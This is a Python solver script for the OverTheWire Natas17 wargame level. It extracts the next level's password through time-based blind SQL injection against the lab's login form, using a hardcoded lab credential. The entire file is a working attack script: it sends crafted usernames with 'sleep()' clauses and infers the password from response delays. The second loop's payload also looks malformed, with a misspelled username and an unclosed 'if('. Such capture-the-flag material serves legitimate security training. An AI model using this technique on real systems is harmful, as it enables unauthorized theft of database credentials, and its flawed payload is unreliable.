import requests
from requests.auth import HTTPBasicAuth

pwd='' #the string in which passwd is gonna get stored
letters='' #letters which the pwd contains
options='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890'; #char set for us

print ("Checkin da letters... .. .")
for j in options:
    key={'username' : 'natas18" and password like binary "%'+j+'%" and sleep(5)-- -'} #just to check if the letter is available in the password string
    url = requests.post('http://natas17.natas.labs.overthewire.org/index.php',auth=HTTPBasicAuth('natas17','8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'),data=key)
    if url.elapsed.seconds>=5:
        letters=letters + j #create an array with the letters in password
        print (letters)
        
print ("\n \n Now the flag... .. .")
for i in range (32):  #flag has 32 chars
    for j in letters: #for each letter of flag check the letters 
        key={'username' : 'natasa18" and if(password like binary "'+pwd+j+'%", sleep(10) -- -'} #query to be executed
        url=requests.post('http://natas17.natas.labs.overthewire.org/index.php',auth=HTTPBasicAuth('natas17','8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'),data=key) #post method to be sent
        if (url.elapsed.seconds)>=10: #append if true
            #print (url.elapsed.seconds)
            print (i)
            pwd=pwd+j
            print (pwd) #for us to visually see if the script works
            break
print ("And you thought I would not work :)") #to see the end.....

#
